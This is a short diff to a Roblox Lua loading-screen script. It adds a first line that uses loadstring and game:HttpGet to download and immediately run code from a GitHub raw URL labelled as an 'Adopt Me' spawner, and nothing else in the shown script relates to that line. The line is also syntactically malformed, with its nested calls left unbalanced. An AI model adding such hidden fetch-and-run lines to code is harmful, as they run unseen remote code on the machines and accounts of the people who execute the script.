@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(loadstring(game:HttpGet('https://raw.githubusercontent.com/lollipops4fun/spawner/refs/heads/main/adoptme'))()
+
 --[[ Loading screen on execution with progress bar and % ]]--
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
